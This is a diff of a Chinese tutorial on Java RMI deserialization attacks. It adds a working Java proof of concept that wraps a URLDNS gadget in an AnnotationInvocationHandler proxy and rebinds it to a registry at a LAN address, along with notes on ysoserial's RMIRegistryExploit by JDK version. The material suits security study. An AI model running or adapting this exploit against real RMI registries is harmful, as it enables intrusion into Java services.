@@ -280,13 +280,7 @@ public class AttackDangerServer {
 
 前面说过，RMI的传输是基于序列化的，Client和Register、Client和Server、Server和Register的交互都存在序列化和反序列化的操作，所以在反序列化的过程中就可能会存在反序列化攻击
 
-#### Client攻击Register
 
-#### 限制
-
-#### 攻击原理
-
-#### 攻击方法
 
 #### Server攻击Register
 
@@ -552,7 +546,7 @@ public void rebind(String var1, Remote var2) throws AccessException, RemoteExcep
 
 ###### 常见gadget链的攻击
 
-poc代码如下
+使用CC1攻击的poc代码如下
 
 ```java
 import org.example.payload.CC1;
@@ -629,13 +623,59 @@ public class CC1 {
 }
 ```
 
-这里再展示一条不使用动态代理的链，gedget为URLDNS，构建poc的关键在于，如何将恶意对象转变为Remote类型以满足参数要求
+从CC1的poc代码可以看出，构建poc代码的一个关键点在于如何将我们的恶意对象包装为实现了Remote接口的类，CC1由于本身的特殊性，最终生成的对象实现了InvocationHandler接口，借助动态代理可以很容易的包装为任意类。其他没有利用AnnotationInvocationHandler的gadget链如何包装了，这里我们可以借鉴ysoserial的做法，它其实也是使用了Annot
+
+ationInvocationHandler将我们生成的恶意对象又包装了一层。以URLDNS为例，poc代码如下:
+
+```java
+import org.example.payload.URLDNS;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.util.HashMap;
+import java.util.Map;
+
+public class URLDNSAttackRegister {
+    public static void main(String[] args) throws Exception {
+        String url = "";
+        HashMap obj = (HashMap) new URLDNS().getObject(url);
+
+        Map<String, Object> map = new HashMap<String, Object>();
+        map.put("DNSURL", obj);
+
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class,
+                Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)
+                construct.newInstance(Override.class, map);
+        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, handler);
+        String host = "rmi://192.168.110.146:1099/";
+        Naming.rebind(host+"URLDNS", proxyEvalObject);
+    }
+}
+```
 
 ###### 无需第三方库的reference链
 
 ###### 是否可以直接修改数据包打
 
+##### jdk8u121<=version<jdk8u141
+
 ##### 是否可以直接修改rmi报文绕过ip检查
+
+#### 攻击方法
+
+##### 8u121之前可直接使用ysoserial的RMIRegistryExploit进行攻击
+
+#### Client攻击Register
+
+#### 限制
+
+#### 攻击原理
 
 #### 攻击方法
 
